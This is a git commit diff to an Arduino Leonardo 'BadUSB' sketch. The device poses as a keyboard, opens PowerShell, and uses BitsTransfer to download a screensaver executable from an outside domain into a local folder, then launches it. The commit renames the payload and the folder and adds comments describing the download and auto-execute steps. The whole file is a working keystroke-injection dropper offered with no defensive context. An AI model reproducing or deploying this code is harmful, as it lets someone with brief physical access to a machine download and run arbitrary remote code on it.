0a8f8c654d8f77ec445fc75299b77bd6160a9d20
1n51d3r <51336717+1n51d3r@users.noreply.github.com>
2019-06-03 20:22:01 +0200

    Update badusb_arduino_leonardo_usb.ino

--- badusb_arduino_leonardo_usb.ino
+++ badusb_arduino_leonardo_usb.ino
@@ -9,18 +9,18 @@ type('r',false);
 Keyboard.releaseAll();
 delay(750);
 
-print(F("powershell"));
+print(F("powershell"));//using powershell to make the operations
 delay(500);
    
 type(KEY_RETURN,false);
 Keyboard.releaseAll();
 delay(500);
-//print(F(",;.:-_´¨Ññ{Ç}`^[+*]'?¡¿0=9)8(7/6&5%4$3·21!º\|@#~€¬pPªoqaz<>"));
+
 print(F("\npowershell Import/Module BitsTransfer<"));
 delay(100);
-print(F("\nStart/BitsTransfer /Source http>&&jaymonsecurity.com&Bicho.scr /Destination c>&ftp&Bicho.scr<"));
+print(F("\nStart/BitsTransfer /Source http>&&jaymonsecurity.com&program.scr /Destination c>&intel&program.scr<"));//Download our program from the server and save it in c:/intel 
 delay(100);
-print(F("\nStart/Process c>&ftp&Bicho.scr<"));
+print(F("\nStart/Process c>&intel&program.scr<"));//autoexecute our program once has been downloaded
 delay(100);
 print(F("\nexit"));
 delay(100);
